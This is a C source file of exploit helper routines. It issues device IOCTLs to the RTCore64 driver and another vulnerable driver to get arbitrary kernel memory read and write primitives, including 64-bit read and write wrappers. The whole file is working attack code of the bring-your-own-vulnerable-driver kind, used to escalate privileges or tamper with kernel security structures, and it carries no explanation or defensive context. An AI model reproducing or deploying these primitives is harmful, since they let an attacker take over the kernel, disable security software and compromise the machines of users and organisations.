#include "struct.h"

BOOL UtilReadKernelMemory(HANDLE hDevice, ULONG_PTR in, ULONG_PTR* out)
{
	ARBITRARY_READ_PRIMITIVE ReadPrimitive;
	NTSTATUS status;
	IO_STATUS_BLOCK iostatus = { 0 };

	RtlSecureZeroMemory(&ReadPrimitive, sizeof(ReadPrimitive));
	ReadPrimitive.address = in;
	ReadPrimitive.unk0 = 0x4141414142424242;

	status = NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &iostatus, 0x9b0c1ec4, &ReadPrimitive, sizeof(ReadPrimitive), &ReadPrimitive, sizeof(ReadPrimitive));
	if (NT_SUCCESS(status))
	{
		*out = ReadPrimitive.value;
		return TRUE;
	}else PRINT_ERROR(L"NtDeviceIoControlFile %08x\n", status);

	return FALSE;
}
BOOL UtilWriteKernelMemory(HANDLE hDevice, ULONG_PTR in, ULONG_PTR value)
{
	ARBITRARY_WRITE_PRIMITIVE WritePrimitive;
	NTSTATUS status;
	DWORD wrote = 0;
	IO_STATUS_BLOCK iostatus = { 0 };

	RtlSecureZeroMemory(&WritePrimitive, sizeof(WritePrimitive));
	WritePrimitive.padding1 = 0x4141414142424242;
	WritePrimitive.address = in;
	WritePrimitive.value_to_write = value;
	
	status = NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &iostatus, 0x9b0c1ec8, &WritePrimitive, sizeof(WritePrimitive), &WritePrimitive, sizeof(WritePrimitive));
	if (NT_SUCCESS(status))
	{
		return TRUE;
	}
	else PRINT_ERROR(L"NtDeviceIoControlFile %08x\n", status);
	return FALSE;
}

BOOL RtWriteKernelMemory(HANDLE hDevice, DWORD size, ULONG_PTR address, DWORD value)
{
	RTCORE64_MEMORY_READ MemoryRead = { 0 };
	NTSTATUS status;
	IO_STATUS_BLOCK iostatus = { 0 };

	MemoryRead.Address = address;
	MemoryRead.ReadSize = size;
	MemoryRead.Value = value;

	status = NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &iostatus, 0x8000204c, &MemoryRead, sizeof(MemoryRead), &MemoryRead, sizeof(MemoryRead));
	if (NT_SUCCESS(status))
	{
		return TRUE;
	}
	else PRINT_ERROR(L"NtDeviceIoControlFile %08x\n", status);
	return FALSE;
}
BOOL RtWriteKernelMemoryDWORD64(HANDLE hDevice, ULONG_PTR address, ULONG_PTR value)
{
	if (RtWriteKernelMemory(hDevice, 4, address, value & 0xFFFFFFFF) && RtWriteKernelMemory(hDevice, 4, address + 4, value >> 32))
		return TRUE;
	else return FALSE;
}
BOOL RtReadKernelMemory(HANDLE hDevice, ULONG_PTR address, DWORD size, DWORD* out)
{
	RTCORE64_MEMORY_READ MemoryRead;
	NTSTATUS status;
	IO_STATUS_BLOCK iostatus = { 0 };

	RtlSecureZeroMemory(&MemoryRead, sizeof(RTCORE64_MEMORY_READ));
	MemoryRead.Address = address;
	MemoryRead.ReadSize = size;

	status = NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &iostatus, 0x80002048, &MemoryRead, sizeof(MemoryRead), &MemoryRead, sizeof(MemoryRead));
	if (NT_SUCCESS(status))
	{
		*out = MemoryRead.Value;
		return TRUE;
	}
	else PRINT_ERROR(L"NtDeviceIoControlFile %08x\n", status);
	return FALSE;
}

BOOL RtReadKernelMemoryDWORD64(HANDLE hDevice, ULONG_PTR address, ULONG_PTR* out)
{
	DWORD value1, value2;

	if (RtReadKernelMemory(hDevice, address + 4, 4, &value1) && RtReadKernelMemory(hDevice, address, 4, &value2))
	{
		*out = (((ULONG_PTR)value1) << 32) | value2;
		return TRUE;
	}
	else return FALSE;
}
